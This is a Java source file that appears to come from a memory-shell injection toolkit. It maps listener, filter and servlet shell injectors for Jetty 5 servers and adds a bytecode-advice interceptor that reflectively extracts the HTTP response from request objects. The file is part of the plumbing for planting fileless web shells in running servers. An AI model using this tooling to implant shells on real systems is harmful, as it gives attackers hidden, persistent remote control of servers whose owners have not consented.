package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.injector.jetty.Jetty5FilterInjector;
import com.reajason.javaweb.memshell.injector.jetty.Jetty5ListenerInjector;
import com.reajason.javaweb.memshell.injector.jetty.Jetty5ServletInjector;
import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2026/7/4
 */
public class Jetty5 extends AbstractServer {

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false) Object response) throws Exception {
            try {
                response = ShellCommonUtil.getFieldValue(request, "_servletHttpResponse");
            } catch (Exception ignored) {
                try {
                    response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "_request"), "_servletHttpResponse");
                } catch (Exception ignored2) {
                    response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "request"), "_servletHttpResponse");
                }
            }
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, Jetty5ListenerInjector.class)
                .addInjector(FILTER, Jetty5FilterInjector.class)
                .addInjector(SERVLET, Jetty5ServletInjector.class)
                .build();
    }
}
